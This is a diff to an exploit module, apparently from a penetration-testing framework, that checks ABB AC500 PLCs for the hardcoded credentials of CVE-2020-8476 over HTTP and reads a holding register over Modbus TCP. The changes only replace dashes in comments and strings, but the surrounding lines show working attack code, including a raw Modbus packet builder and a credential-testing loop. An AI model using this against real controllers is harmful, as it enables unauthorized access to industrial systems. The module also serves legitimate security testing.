@@ -15,7 +15,7 @@ were publicly disclosed via CISA ICS Advisory ICSA-20-049-03.
 
 This module tests known hardcoded credential combinations against:
   1. Web management interface (HTTP/HTTPS)
-  2. Modbus TCP (FC3 read — indirectly confirms access)
+  2. Modbus TCP (FC3 read - indirectly confirms access)
 
 References:
   - CVE-2020-8476 (NVD)
@@ -63,7 +63,7 @@ _HARDCODED_CREDS = [
 
 
 def _modbus_read(target: str, port: int, timeout: int) -> bool:
-    """Read holding register 0 via Modbus FC3 — confirms Modbus access."""
+    """Read holding register 0 via Modbus FC3 - confirms Modbus access."""
     pdu = struct.pack(">HHHBBHH", 0x0001, 0, 6, 0x01, 0x03, 0, 1)
     try:
         sock = socket.create_connection((target, port), timeout=timeout)
@@ -114,7 +114,7 @@ class Exploit(Exploit):
         "description": (
             "Tests known hardcoded and default credentials against ABB AC500 PLCs "
             "via the web management interface (HTTP) and Modbus/TCP. CVE-2020-8476 "
-            "(CVSS 9.8) — ABB AC500 firmware contains hardcoded credentials that "
+            "(CVSS 9.8) - ABB AC500 firmware contains hardcoded credentials that "
             "cannot be changed, allowing unauthenticated attackers to gain full "
             "device access. CISA ICSA-20-049-03."
         ),
@@ -186,7 +186,7 @@ class Exploit(Exploit):
         print_status(f"[CVE-2020-8476] Checking Modbus accessibility on {self.target}:{self.modbus_port}...")
         if _modbus_read(self.target, self.modbus_port, self.timeout):
             print_success(
-                f"[CVE-2020-8476] Modbus TCP accessible on {self.target}:{self.modbus_port} — "
+                f"[CVE-2020-8476] Modbus TCP accessible on {self.target}:{self.modbus_port} - "
                 "PLC register read without authentication."
             )
 
@@ -204,7 +204,7 @@ class Exploit(Exploit):
             elif code == 401:
                 pass  # wrong credential
             elif code == -1:
-                print_info("[CVE-2020-8476] HTTP port not responding — skipping web checks.")
+                print_info("[CVE-2020-8476] HTTP port not responding - skipping web checks.")
                 break
 
         if not found:
